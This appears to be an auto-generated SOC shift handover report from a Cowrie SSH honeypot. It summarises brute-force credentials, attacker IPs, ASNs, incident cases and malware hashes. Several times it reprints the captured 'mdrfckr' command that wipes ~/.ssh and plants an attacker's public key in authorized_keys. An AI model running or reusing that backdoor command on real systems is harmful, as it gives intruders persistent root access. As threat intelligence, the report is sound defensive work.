# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-27 |
| **Generated At** | 2026-03-27T18:53:45Z |
| **Shift Time** | 18:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **49** |
| Confirmed Threats | **35** |
| False Positives Filtered | **14** (28.6%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **16** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **39** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **32** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **14** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `nobody` | 3 |
| `test` | 2 |
| `debian` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 4 |
| `raspberry` | 2 |
| `qwe123qwe!@#` | 1 |
| `1234567890` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `qwe123qwe!@#` | 1 |
| `test` | `1234567890` | 1 |
| `root` | `1qaz2wsx1qaz` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwe123qwe!@#` | `103.123.53.88` | 2026-03-27T16:54:53 |
| `root` | `3245gs5662d34` | `103.123.53.88` | 2026-03-27T16:54:55 |
| `root` | `1qaz2wsx1qaz` | `83.92.117.52` | 2026-03-27T17:09:25 |
| `root` | `3245gs5662d34` | `83.92.117.52` | 2026-03-27T17:09:29 |
| `root` | `meimima` | `180.184.38.93` | 2026-03-27T17:57:47 |
| `root` | `3245gs5662d34` | `180.184.38.93` | 2026-03-27T17:58:04 |
| `root` | `novoadmin` | `116.193.190.134` | 2026-03-27T18:01:12 |
| `root` | `3245gs5662d34` | `116.193.190.134` | 2026-03-27T18:01:18 |
| `root` | `pa55w0rd123` | `103.63.25.53` | 2026-03-27T18:06:43 |
| `root` | `3245gs5662d34` | `103.63.25.53` | 2026-03-27T18:06:47 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `83.92.117.52`, `180.184.38.93`, `116.193.190.134`, `103.63.25.53`, `103.123.53.88`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **29** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS16135` | Turkcell A.S. | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 2 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS132110` | DMIT Inc | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-00a2e95c4ccd

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-03-27 16:54 |
| **Last Seen** | 2026-03-27 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 16:54:53` | `cowrie.session.connect` |
| `2026-03-27 16:54:53` | `cowrie.client.version` |
| `2026-03-27 16:54:53` | `cowrie.client.kex` |
| `2026-03-27 16:54:53` | `cowrie.login.success` |
| `2026-03-27 16:54:53` | `cowrie.session.params` |
| `2026-03-27 16:54:53` | `cowrie.command.input` |
| `2026-03-27 16:54:53` | `cowrie.command.failed` |
| `2026-03-27 16:54:53` | `cowrie.log.closed` |
| `2026-03-27 16:54:53` | `cowrie.session.params` |
| `2026-03-27 16:54:53` | `cowrie.command.input` |
| `2026-03-27 16:54:54` | `cowrie.session.file_download` |
| `2026-03-27 16:54:54` | `cowrie.log.closed` |
| `2026-03-27 16:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c609c999766

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-03-27 16:54 |
| **Last Seen** | 2026-03-27 16:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 16:54:55` | `cowrie.session.connect` |
| `2026-03-27 16:54:55` | `cowrie.client.version` |
| `2026-03-27 16:54:55` | `cowrie.client.kex` |
| `2026-03-27 16:54:55` | `cowrie.login.success` |
| `2026-03-27 16:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53517574f7e

| Field | Detail |
|---|---|
| **Source IP** | `83.92.117[.]52` |
| **First Seen** | 2026-03-27 17:09 |
| **Last Seen** | 2026-03-27 17:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 17:09:25` | `cowrie.session.connect` |
| `2026-03-27 17:09:25` | `cowrie.client.version` |
| `2026-03-27 17:09:25` | `cowrie.client.kex` |
| `2026-03-27 17:09:25` | `cowrie.login.success` |
| `2026-03-27 17:09:26` | `cowrie.session.params` |
| `2026-03-27 17:09:26` | `cowrie.command.input` |
| `2026-03-27 17:09:26` | `cowrie.command.failed` |
| `2026-03-27 17:09:26` | `cowrie.log.closed` |
| `2026-03-27 17:09:26` | `cowrie.session.params` |
| `2026-03-27 17:09:26` | `cowrie.command.input` |
| `2026-03-27 17:09:26` | `cowrie.session.file_download` |
| `2026-03-27 17:09:26` | `cowrie.log.closed` |
| `2026-03-27 17:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.92.117[.]52` to AbuseIPDB if not already reported
- [ ] Block `83.92.117[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120da5c4a03d

| Field | Detail |
|---|---|
| **Source IP** | `83.92.117[.]52` |
| **First Seen** | 2026-03-27 17:09 |
| **Last Seen** | 2026-03-27 17:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 17:09:29` | `cowrie.session.connect` |
| `2026-03-27 17:09:29` | `cowrie.client.version` |
| `2026-03-27 17:09:29` | `cowrie.client.kex` |
| `2026-03-27 17:09:29` | `cowrie.login.success` |
| `2026-03-27 17:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.92.117[.]52` to AbuseIPDB if not already reported
- [ ] Block `83.92.117[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-509ad349cec6

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-03-27 17:57 |
| **Last Seen** | 2026-03-27 17:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 17:57:45` | `cowrie.session.connect` |
| `2026-03-27 17:57:45` | `cowrie.client.version` |
| `2026-03-27 17:57:45` | `cowrie.client.kex` |
| `2026-03-27 17:57:47` | `cowrie.login.success` |
| `2026-03-27 17:57:49` | `cowrie.session.params` |
| `2026-03-27 17:57:49` | `cowrie.command.input` |
| `2026-03-27 17:57:49` | `cowrie.command.failed` |
| `2026-03-27 17:57:49` | `cowrie.log.closed` |
| `2026-03-27 17:57:50` | `cowrie.session.params` |
| `2026-03-27 17:57:50` | `cowrie.command.input` |
| `2026-03-27 17:57:50` | `cowrie.session.file_download` |
| `2026-03-27 17:57:50` | `cowrie.log.closed` |
| `2026-03-27 17:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e9d278a7e9

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-03-27 17:58 |
| **Last Seen** | 2026-03-27 18:03 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 17:58:00` | `cowrie.session.connect` |
| `2026-03-27 17:58:00` | `cowrie.client.version` |
| `2026-03-27 17:58:02` | `cowrie.client.kex` |
| `2026-03-27 17:58:04` | `cowrie.login.success` |
| `2026-03-27 18:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f924eab3817

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]134` |
| **First Seen** | 2026-03-27 18:01 |
| **Last Seen** | 2026-03-27 18:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 18:01:11` | `cowrie.session.connect` |
| `2026-03-27 18:01:11` | `cowrie.client.version` |
| `2026-03-27 18:01:11` | `cowrie.client.kex` |
| `2026-03-27 18:01:12` | `cowrie.login.success` |
| `2026-03-27 18:01:13` | `cowrie.session.params` |
| `2026-03-27 18:01:13` | `cowrie.command.input` |
| `2026-03-27 18:01:13` | `cowrie.command.failed` |
| `2026-03-27 18:01:13` | `cowrie.log.closed` |
| `2026-03-27 18:01:13` | `cowrie.session.params` |
| `2026-03-27 18:01:13` | `cowrie.command.input` |
| `2026-03-27 18:01:14` | `cowrie.session.file_download` |
| `2026-03-27 18:01:14` | `cowrie.log.closed` |
| `2026-03-27 18:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]134` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ee4d80cd59b

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]134` |
| **First Seen** | 2026-03-27 18:01 |
| **Last Seen** | 2026-03-27 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 18:01:17` | `cowrie.session.connect` |
| `2026-03-27 18:01:17` | `cowrie.client.version` |
| `2026-03-27 18:01:17` | `cowrie.client.kex` |
| `2026-03-27 18:01:18` | `cowrie.login.success` |
| `2026-03-27 18:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]134` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49d8d767125f

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]53` |
| **First Seen** | 2026-03-27 18:06 |
| **Last Seen** | 2026-03-27 18:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 18:06:42` | `cowrie.session.connect` |
| `2026-03-27 18:06:42` | `cowrie.client.version` |
| `2026-03-27 18:06:42` | `cowrie.client.kex` |
| `2026-03-27 18:06:43` | `cowrie.login.success` |
| `2026-03-27 18:06:43` | `cowrie.session.params` |
| `2026-03-27 18:06:43` | `cowrie.command.input` |
| `2026-03-27 18:06:43` | `cowrie.command.failed` |
| `2026-03-27 18:06:44` | `cowrie.log.closed` |
| `2026-03-27 18:06:44` | `cowrie.session.params` |
| `2026-03-27 18:06:44` | `cowrie.command.input` |
| `2026-03-27 18:06:44` | `cowrie.session.file_download` |
| `2026-03-27 18:06:44` | `cowrie.log.closed` |
| `2026-03-27 18:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]53` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57bb61908db

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]53` |
| **First Seen** | 2026-03-27 18:06 |
| **Last Seen** | 2026-03-27 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 18:06:46` | `cowrie.session.connect` |
| `2026-03-27 18:06:46` | `cowrie.client.version` |
| `2026-03-27 18:06:47` | `cowrie.client.kex` |
| `2026-03-27 18:06:47` | `cowrie.login.success` |
| `2026-03-27 18:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]53` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.123.53[.]88` | 1 | 2026-03-27 16:54 | 2026-03-27 16:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.63.25[.]53` | 1 | 2026-03-27 18:06 | 2026-03-27 18:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.20[.]166` | 1 | 2026-03-27 18:45 | 2026-03-27 18:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.140.211[.]102` | 1 | 2026-03-27 17:57 | 2026-03-27 17:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.193.190[.]134` | 1 | 2026-03-27 18:01 | 2026-03-27 18:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.59.10[.]205` | 1 | 2026-03-27 18:13 | 2026-03-27 18:13 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.45.255[.]153` | 1 | 2026-03-27 18:27 | 2026-03-27 18:27 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-03-27 16:54 | 2026-03-27 16:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]50` | 1 | 2026-03-27 17:33 | 2026-03-27 17:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]55` | 1 | 2026-03-27 18:50 | 2026-03-27 18:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.96.190[.]108` | 1 | 2026-03-27 17:40 | 2026-03-27 17:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.184.38[.]93` | 1 | 2026-03-27 17:57 | 2026-03-27 17:58 | 51s | 0 | `T1592` | 🟢 LOW |
| `183.3.133[.]47` | 1 | 2026-03-27 18:21 | 2026-03-27 18:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.59.178[.]29` | 1 | 2026-03-27 17:48 | 2026-03-27 17:48 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.43.107[.]179` | 1 | 2026-03-27 18:08 | 2026-03-27 18:08 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.67.123[.]202` | 1 | 2026-03-27 17:11 | 2026-03-27 17:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `38.17.158[.]105` | 1 | 2026-03-27 17:35 | 2026-03-27 17:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.167.250[.]45` | 1 | 2026-03-27 17:53 | 2026-03-27 17:53 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.11.162[.]163` | 1 | 2026-03-27 17:41 | 2026-03-27 17:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `58.49.113[.]138` | 1 | 2026-03-27 18:01 | 2026-03-27 18:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.56.128[.]190` | 1 | 2026-03-27 18:10 | 2026-03-27 18:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.182.132[.]94` | 1 | 2026-03-27 17:29 | 2026-03-27 17:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.92.117[.]52` | 1 | 2026-03-27 17:09 | 2026-03-27 17:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.152.57[.]60` | 1 | 2026-03-27 17:31 | 2026-03-27 17:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.87.248[.]223` | 1 | 2026-03-27 17:13 | 2026-03-27 17:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.45.255[.]153` | KR | Korea Telecom | **100** ⚠️ | 10 |
| `111.70.20[.]166` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `188.59.178[.]29` | TR | TURKCELL INTERNET | **100** ⚠️ | 12 |
| `179.96.190[.]108` | BR | FASTNET TELECOM | **100** ⚠️ | 27 |
| `62.182.132[.]94` | RU | Net By Net Holding LLC | **100** ⚠️ | 44 |
| `103.123.53[.]88` | IN | YOTTA NETWORK SERVICES PRIVATE LIMITED | **100** ⚠️ | 50 |
| `116.59.10[.]205` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 14 |
| `38.17.158[.]105` | VE | TELECOMUNICACIONES G-NETWORK, C.A. | **100** ⚠️ | 7 |
